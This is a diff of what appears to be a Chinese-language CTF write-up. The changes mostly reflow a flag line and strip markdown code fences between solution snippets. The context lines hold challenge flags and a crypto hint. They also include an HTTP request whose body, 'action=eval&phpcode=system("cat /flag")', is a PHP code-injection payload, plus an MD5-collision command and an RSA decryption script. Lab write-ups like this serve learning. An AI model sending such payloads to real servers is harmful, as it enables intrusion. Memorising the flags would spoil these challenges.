@@ -60,7 +60,8 @@ flag：flag{5f5491b6-fddf-4be8-ab44-5a18831cc45b}
 
 文件名：（xxtea_13e418f4e3f3d389f3cee45e90017de4.zip）
 
-题目内容：It’s getting hard to even copy the data this time. flag:flag{4eb88a16-be48-4de2-ab2a-ed09a09ed386}
+题目内容：It’s getting hard to even copy the data this time. flag:
+flag{4eb88a16-be48-4de2-ab2a-ed09a09ed386}
 
 题解：根据题目给的步骤反过来解密即可。
 
@@ -167,17 +168,7 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 42
 
 action=eval&phpcode=system("cat /flag")
-```
-
-
-
-```
 fastcoll_v1.0.0.5.exe -p gamelab_1.txt -o gamelab_2.txt gamelab_3.txt
-```
-
-
-
-```
 import gmpy2
 from Crypto.Util.number import *
 
@@ -191,11 +182,6 @@ phi = n + 1 - param1
 d = gmpy2.invert(e, phi)
 m = pow(ciphertext[0], d, n)
 print(long_to_bytes(m))
-```
-
-
-
-```
 import random
 import base64
 
